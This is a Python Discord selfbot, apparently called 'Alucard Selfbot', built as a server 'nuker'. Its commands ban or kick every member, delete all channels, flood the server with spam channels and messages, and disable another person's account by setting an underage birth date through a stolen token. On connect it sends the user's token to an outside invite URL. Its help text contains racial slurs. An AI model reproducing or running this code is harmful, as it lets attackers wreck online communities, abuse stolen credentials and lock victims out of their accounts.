class NUKER():
    __version__ = 1.2

import keep_alive
keep_alive.keep_alive()    

import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
from gtts import gTTS


with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')
nitro_sniper = config.get('nitro_sniper')
privnote_sniper = config.get('privnote_sniper')

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

def Clear():
    os.system('cls')
Clear()

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            bot.run(token, bot=False, reconnect=True)
            os.system(f'title (Alucard Selfbot) - Version {NUKER.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed"+Fore.RESET)
            os.system('pause >NUL')

bot = commands.Bot(command_prefix=prefix, self_bot=True)

bot.remove_command('help')

@bot.event
async def on_message(message):

    def GiveawayData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)  

    def NitroData(elapsed, code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
    +Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")  
    if 'discord.gift/' in message.content:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')
                
            headers = {'Authorization': token}
            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', 
                headers=headers,
            ).text
        
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'You are being rate limited.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Ratelimited]"+Fore.RESET)  
                NitroData(elapsed, code)

    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
                    SlotBotData()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:    
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()            
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{bot.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:    
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    await bot.process_commands(message)

@bot.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    print(f'''{Fore.RED}
  ██████ ▄▄▄█████▓ ▄▄▄       ▄████▄  ▓█████▓██   ██▓    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▒██  ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▒███    ▒██ ██░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄  ░ ▐██▓░   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░░▒████▒ ░ ██▒▓░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░  ██▒▒▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░  ▒    ░ ░  ░▓██ ░▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░    ░        ░   ▒   ░           ░   ▒ ▒ ░░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
      ░                 ░  ░░ ░         ░  ░░ ░                 ░    ░     ░  ░      ░  ░   ░     
                            ░               ░ ░                                                   


                                                            {Fore.MAGENTA}Made by Artix
    ''')
    print(f'{Fore.RED}                      Version | {NUKER.__version__}')
    print(f'{Fore.MAGENTA}                      Logged in as: | {bot.user.name}  {bot.user.discriminator}'
   f'{Fore.YELLOW}   |   User ID | {bot.user.id}')
    print(f'{Fore.GREEN}                      Prefix | {prefix}')
    print(f'{Fore.CYAN}                      Nitro Sniper | {nitro}')
    print(f'{Fore.CYAN}                      Giveaway Sniper | {giveaway}') 
    print(f'{Fore.CYAN}                      Slotbot Sniper | {slotbot}')
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    r = requests.post('https://discord.gg/stacey', headers=headers)
    if r.status_code == 200:
        return True
    else:
        return False    

@bot.command()
async def cmd(ctx):
 await ctx.message.delete()
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="𝓢𝓽𝓪𝓬𝓮𝔂 𝓒𝓸𝓶𝓶𝓪𝓷𝓭𝓼 💦", icon_url=ctx.author.avatar_url)

 embed.add_field(name="𝓌𝒾𝓏𝓏", value="𝔽𝕦𝕔𝕜𝕤 𝕥𝕙𝕖 𝕤𝕖𝕣𝕧𝕖𝕣.", inline=False)
 embed.add_field(name="𝒷𝒶𝓃", value="𝔹𝕒𝕟𝕤 𝕒𝕝𝕝 𝕕𝕒 𝕟𝕚𝕘𝕘𝕒𝕤.", inline=False)
 embed.add_field(name="𝓀𝒾𝒸𝓀", value="𝕂𝕚𝕔𝕜𝕤 𝕒𝕝𝕝 𝕕𝕒 𝕟𝕚𝕘𝕘𝕒𝕤.",inline=False)
 embed.add_field(name="𝓅𝓊𝓇𝑔𝑒", value="ℙ𝕦𝕣𝕘𝕖 𝕪𝕠 𝕞𝕖𝕤𝕤𝕒𝕘𝕖𝕤.", inline=False)
 embed.add_field(name="𝓈𝓅𝒶𝓂", value="𝕊𝕡𝕒𝕞 𝕪𝕠 𝕤𝕙𝕚𝕥.", inline=False)
 embed.add_field(name="𝓅𝒾𝓃𝑔", value="ℙ𝕚𝕟𝕘 𝕡𝕠𝕟𝕘 𝕟𝕚𝕘𝕘𝕒.", inline=False)
 embed.add_field(name="𝓭𝓲𝓼𝓪𝓫𝓵𝓮", value="𝔻𝕚𝕤𝕒𝕓𝕝𝕖𝕤 𝕒𝕟 𝕒𝕔𝕔𝕠𝕦𝕟𝕥 𝕔𝕦𝕫.", inline=False)
 embed.set_image(url="https://i.imgur.com/h07l7rD.gif")
 embed.set_footer(text="Narko | 4tacey")
 embed.set_thumbnail(url="https://i.imgur.com/yVhwJch.gif")
 await ctx.send(embed=embed)
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

@bot.command(pass_context=True)
async def wizz(ctx):
    await ctx.message.delete()
    await ctx.send("**Now Wizzing**")
    show_avatar = discord.Embed(

     color = ctx.author.color 
    )
    show_avatar.set_image(url='https://media.giphy.com/media/69zK28wuaA7ZaD2WKt/giphy.gif')

    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been banned from {ctx.guild.name}")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f'Spam channel deleting proccession has been complete.')         
    for i in range(1, 25):
              await ctx.guild.create_text_channel(name=f'DONTFUCKWITHSTACEY {i}')
              await ctx.guild.create_voice_channel(name=f'STACEY LOVES U {i}')
              await ctx.guild.create_category(name=f'ARTIXWASHERE {i}')
              print(f'{Fore.GREEN}Spam role and channel creating proccession has been complete.')
              print('completed cuh')

@bot.command(pass_context=True)
async def ban(ctx):
    await ctx.message.delete()
    await ctx.send("***Stacey dont lose***")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://media.giphy.com/media/7XrxqU2vS4FKSbjPWs/giphy.gif')
    await ctx.send(embed=show_avatar)
    print ("Starting Up Nuker")
    print ("Banning All....")
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been banned from {ctx.guild.name}")

@bot.command(pass_context=True)
async def kick(ctx):
    await ctx.message.delete()
    await ctx.send("***Stacey dont lose***")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://media.giphy.com/media/4N5d87SESImgBF579X/giphy.gif')
    await ctx.send(embed=show_avatar)
    print ("Starting Up Nuker")
    print ("Kicking All....")
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} has been kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been kicked from {ctx.guild.name}")

@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"`{round(bot.latency *1000)}ms.`")

@bot.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == bot.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass


@bot.command()
async def stream(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await bot.change_presence(activity=stream)                

@bot.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@bot.command()
async def disable(ctx, _token):
    await ctx.message.delete()
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': _token}, json={'date_of_birth': '2017-7-16'})
    if r.status_code == 400:
       await ctx.send(f"`Account disabled. RIP`")
       print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
    else:
       await ctx.send(f"`Invalid token cuhh`")
       print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')

bot.run(token, bot=False)